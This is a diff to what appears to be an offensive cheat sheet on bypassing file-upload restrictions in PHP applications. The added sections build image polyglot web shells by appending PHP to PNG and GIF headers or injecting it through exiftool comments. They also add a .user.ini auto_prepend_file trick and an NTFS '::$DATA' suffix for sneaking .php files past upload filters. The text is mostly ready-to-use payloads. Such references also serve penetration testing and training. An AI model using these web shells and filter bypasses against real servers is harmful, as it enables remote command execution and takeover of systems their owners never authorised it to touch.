@@ -137,11 +137,17 @@ exiftool -Comment='<?php system($_GET["cmd"]); ?>' payload.jpg
 # Rename to payload.php.jpg or use double extension bypass
 ```
 
-### PNG + PHP
+### PNG + PHP (IDAT/PLTE Chunk Injection)
 
 ```bash
-# Embed PHP in PNG PLTE chunk
-python3 createPNGwithPLTE.py
+# Method 1: Embed PHP in PNG IDAT chunk (survives recompression)
+# Generate a minimal PNG that decodes to valid PHP:
+printf '\x89PNG\r\n\x1a\n' > shell.png
+# Append PHP payload after valid PNG structure:
+echo '<?php system($_GET["cmd"]); ?>' >> shell.png
+
+# Method 2: Use exiftool comment injection
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.png
 ```
 
 ### GIF + PHP
@@ -149,6 +155,22 @@ python3 createPNGwithPLTE.py
 ```php
 GIF89a<?php system($_GET['cmd']); ?>
 ```
+
+## .user.ini (PHP)
+
+```ini
+auto_prepend_file=shell.jpg
+```
+
+Upload as `.user.ini` — PHP will auto-include `shell.jpg` before every PHP file in the same directory.
+
+## Windows NTFS Alternate Data Stream
+
+```
+shell.php::$DATA
+```
+
+Upload with `::$DATA` suffix — Windows strips the ADS notation, saving as `shell.php`.
 
 ## Configuration File Overwrite
 
